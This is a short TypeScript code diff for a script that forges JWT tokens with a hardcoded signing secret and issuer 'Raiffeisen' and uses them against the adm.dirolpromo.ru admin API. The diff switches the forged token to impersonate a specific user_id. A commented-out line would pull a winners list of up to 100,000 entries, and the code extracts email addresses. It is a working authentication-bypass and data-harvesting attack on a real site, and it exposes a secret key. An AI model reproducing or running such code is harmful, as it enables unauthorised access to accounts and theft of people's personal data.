@@ -14,7 +14,7 @@ const utils = new Utils();
     let match = value.match(/([^ ]+@.*?) /);
     return match[1];
   });
-  const request = new CustomRequest({}, true);
+  const request = new CustomRequest({}, false);
   // const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100000").catch(value => <any>console.log(value));
   // const data = res.data;
 
@@ -34,7 +34,7 @@ async function main(request: CustomRequest, email) {
   const secretKey = '[N%"D9&RJ{_A3EkK5`7dkh+%:';
   const now = Date.now() / 1000 - 200;
 
-  const token = jwt.sign({ "iss": "Raiffeisen", email, user_id: 0, "iat": now, "exp": now + 900 }, secretKey);
+  const token = jwt.sign({ "iss": "Raiffeisen", user_id: 12111, "iat": now, "exp": now + 900 }, secretKey);
   try {
     let res = await request.get("https://adm.dirolpromo.ru/api/client", { headers: { 'Authorization': token } });
     const json = res.data;
@@ -47,6 +47,7 @@ async function main(request: CustomRequest, email) {
   } catch (e) {
     console.log(e)
   }
+  process.exit();
 
   return;
 }
